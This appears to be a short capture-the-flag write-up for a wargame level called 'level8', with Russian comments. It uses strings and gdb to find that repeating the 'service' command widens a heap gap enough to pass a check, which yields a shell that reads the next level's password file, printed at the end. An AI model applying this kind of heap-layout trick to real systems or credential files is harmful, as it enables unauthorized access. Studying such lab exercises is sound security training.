$> strings level8 | less

[...]
%p, %p
auth
reset
service
login
/bin/sh
Password:
[...]

# видим несколько интересных строк, попробуем их ввести

$> ./level8
(nil), (nil)
> auth
0x804a008, (nil)
> service
0x804a008, 0x804a018
> login
Password:
> auth
0x804a028, 0x804a018
> auth
0x804a038, 0x804a018

# когда мы пишем "auth" и "service", два адреса обновляются на 0x10 от последнего записанного адреса
# Посмотрим, сможем ли мы найти больше с помощью gdb

gdb> disass main
[...]
   0x08048625 <+193>:	cmp    eax,0x1e
[...]

# Мы видим, что cmp сделан со значением 0x1e == 31
# Посмотрим, что будет, если мы сделаем разницу между адресами 'auth' и 'service' 0x20 == 32

$> ./level8

> service
0x804a008, 0x804a018
> service
0x804a008, 0x804a028
> login

$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a